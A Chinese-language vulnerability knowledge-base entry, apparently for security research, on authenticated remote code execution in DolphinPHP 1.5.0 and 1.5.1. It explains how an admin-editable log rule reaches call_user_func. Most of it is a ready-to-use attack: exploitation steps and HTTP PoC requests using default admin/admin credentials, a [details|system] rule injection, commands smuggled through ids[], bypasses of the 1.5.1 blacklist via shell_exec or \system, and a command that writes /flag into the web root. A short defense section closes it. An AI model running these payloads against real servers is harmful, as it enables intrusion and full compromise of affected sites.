---
id: web-php-framework-dolphinphp-action-log-rule-call-user-func-rce
title: DolphinPHP 后台行为管理日志规则注入：call_user_func 回调任意函数 RCE（v1.5.0；v1.5.1 黑名单可绕过）
type: scenario
domain: web
path: web/php/framework
technique: dolphinphp-action-log-rule-call-user-func-injection
aliases:
- DolphinPHP RCE
- 海豚PHP 行为管理 RCE
- admin_action log 规则注入
- 日志规则 call_user_func
- attachment_disable ids RCE
- is_disable_func 绕过
tags:
- php
- dolphinphp
- framework
- rce
- call_user_func
- log-injection
- blacklist-bypass
- authenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: 1.5.0；1.5.1（修复不完整，is_disable_func 黑名单可绕过）
verification:
  verified_by: verifier-V342
  verified_at: '2026-11-08T20:48:15+08:00'
  notes: 已对照原文及31张图片核对：admin_action.log 可通过行为管理编辑且无校验→action_log 用 [变量|函数] 规则 call_user_func；Attachment::disable 的 ids[] 经 setStatus 透传为 details；截图确认 [details|system]+ids[]=calc 弹出计算器；v1.5.1 is_disable_func 实现、disable_functions 清单及 \system 绕过均有代码/截图佐证。未在本机实测复现。
---

## 一句话结论

DolphinPHP 的后台「行为管理」允许编辑行为的日志规则并原样存入 `admin_action.log`，`action_log()` 解析规则中的 `[变量|函数]` 片段后直接执行 `call_user_func($函数, $变量值)`；把 `attachment_disable` 的规则改成 `[details|system]`，再在「禁用附件」请求里把 `ids[]` 换成命令，即形成后台到 RCE 的完整链路。v1.5.1 增加 `is_disable_func()` 黑名单校验，但仍可用未列入清单的 `shell_exec` 或前置反斜杠 `\system` 绕过。

## 原理

- **可控回调名**：`action_log($action, $model, $record_id, $user_id, $details)` 先用 `model('admin/action')->where('module', $module)->getByName($action)` 查行为定义，日志规则来自 `admin_action` 表的 `log` 字段；该字段在后台「系统 → 行为管理」编辑时没有任何合法性校验。规则经 `preg_match_all` 提取方括号片段后 `explode('|', $value)`，`$param[1]` 直接作为 `call_user_func` 的第一个参数（回调函数名），规则可写成 `[details|system]`。
- **可控回调参数**：`$param[0]` 是 `$log` 数组的键，`$log` 含 `user/record/model/time/data/details`；`details` 即 `action_log` 的第 5 个实参，由调用方透传。附件控制器 `Attachment::disable()` → `setStatus('disable')` → 父类 `setStatus()` 组装 `record = ['attachment_disable','admin_attachment',0,UID,$ids]` 并 `call_user_func_array('action_log', $record)`，其中 `$ids = implode(',', input('post.ids/a'))`，来自 POST 的 `ids[]`，无过滤、无类型约束。因此 `$log['details']` 完全可控。
- **链路成立的原因**：日志规则本应只是"变量与格式化函数"的展示配置，但实现把"配置里的函数名"当作可调用符号执行，且参数取的是同一次请求里的用户输入；配置写权限与请求参数两个可控点在同一函数内汇合，等价于一个持久的任意函数调用原语。
- **v1.5.1 修复与绕过**：修复在 `call_user_func` 前增加 `isset($param[1]) && $param[1] != ''` 与 `is_disable_func($param[1])`（实现为 `in_array(strtolower($func), config('system.disable_functions'))`）。两个缺陷：一是黑名单不全，清单只有 eval/passthru/exec/system/chroot/chgrp/popen/ini_alter/ini_restore/dl/openlog/syslog/readlink/symlink/popepassthru/phpinfo，`shell_exec` 不在其中；二是字符串精确匹配可被前置反斜杠绕过，`\system` 与 `system` 在 `in_array` 下不相等，但 `call_user_func('\system', ...)` 仍按全局命名空间解析并执行。

## 触发条件

- 能登录后台并具有「行为管理」编辑权限（默认口令 admin/admin 的实例直接满足；拿到后台会话即可）。
- 系统日志功能开启（`config('system_log')` 为真），否则 `action_log` 不进入规则解析分支。
- 存在一个可触发且会把用户输入作为 `$details` 传入 `action_log` 的功能点；文中实测的是「附件管理 → 禁用附件」，需要先上传一个附件使禁用操作成功。
- 目标可出网或 Web 目录可写，用于处理无回显问题。

## 利用步骤

1. 登录后台：`POST /admin.php/user/publics/signin.html`，`username=admin&password=admin`。
2. 进入系统 → 行为管理，编辑标识为 `attachment_disable` 的行为（id 13），把「日志规则」改为 `[details|system] 禁用了附件：附件ID([details])`，保存（`POST /admin.php/admin/action/edit/id/13.html`）。
3. 在个人信息处上传一张头像/或「附件管理」上传任意文件，使附件列表存在记录（禁用操作需要有效附件 id；上传接口为 `/admin.php/admin/attachment/upload/dir/images/module/admin.html`）。
4. 触发禁用并注入命令：`POST /admin.php/admin/attachment/disable/...`，请求体 `ids[]=<命令>`。服务端执行 `call_user_func("system", "<命令>")`。
5. 因该链路无回显，将命令改为写 Web 目录或反弹 shell：如 `echo `cat /flag` > /var/www/html/public/flag.txt`，再 `GET /flag.txt` 取回。
6. 目标为 v1.5.1 时，规则改用 `[details|shell_exec]`（黑名单遗漏），或 `[details|\system]`（反斜杠绕过 `in_array` 精确匹配）。

## PoC

```http
POST /admin.php/user/publics/signin.html HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin
```

```http
POST /admin.php/admin/action/edit/id/13.html HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=13&module=admin&name=attachment_disable&title=禁用附件&remark=禁用附件&rule=&log=[details|system] 禁用了附件：附件ID([details])&status=1
```

```http
POST /admin.php/admin/attachment/disable HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ids%5B%5D=calc
```

v1.5.1 绕过只需把日志规则中的 `system` 换成 `shell_exec` 或 `\system`。无回显外带示例：`ids[]=echo `cat /flag` > /var/www/html/public/flag.txt`。

## 变体与关联

- **黑名单遗漏变体**：`is_disable_func` 清单未包含 `shell_exec`，规则写 `[details|shell_exec]` 即可继续执行命令；同类遗漏函数可按清单比对扩展。
- **反斜杠绕过变体**：PHP 中 `\system` 与 `system` 指向同一全局函数，而 `in_array(strtolower($func), $disable_functions)` 是字符串精确匹配；`$param[1] != ''` 检查不影响非空反斜杠函数名。该手法是通用的"PHP 函数名前置反斜杠绕过 in_array 精确黑名单"技巧，与具体产品无关。
- **触发点扩展**：任何最终调用 `action_log` 且把请求参数作为 `$details` 透传的后台功能都可替代「禁用附件」，例如其他带 `setStatus` 的批量操作；只要攻击者能控制 `ids` 等实参即可。
- **同 sink 家族**：ThinkPHP 系应用大量使用 `call_user_func`/`call_user_func_array` 承接配置或参数；审计时重点找"函数名来自数据库/配置/用户输入"的调用点。

## 检测与防御

- 禁止把数据库/配置中的函数名直接交给 `call_user_func`；如确需格式化回调，使用硬编码映射表（`$map = ['get_nickname' => ...]`）而非任意函数名。
- 若保留黑名单，务必先归一化（`ltrim($func, '\\')`）再做符号级校验，并改用完整且服务端强制的 `disable_functions`；应用层黑名单永远应视为兜底而非边界。
- 审计并告警「行为管理」日志规则的变更（`admin_action.log`），该类配置正常极少修改；同时限制后台账户与默认口令。
- 对 `/admin/attachment/disable` 等批量操作的 `ids` 做严格数字/ID 校验，拒绝非数字内容；WAF 可检测 `ids[]` 中的命令字符与 `[xxx|yyy]` 形式日志规则。
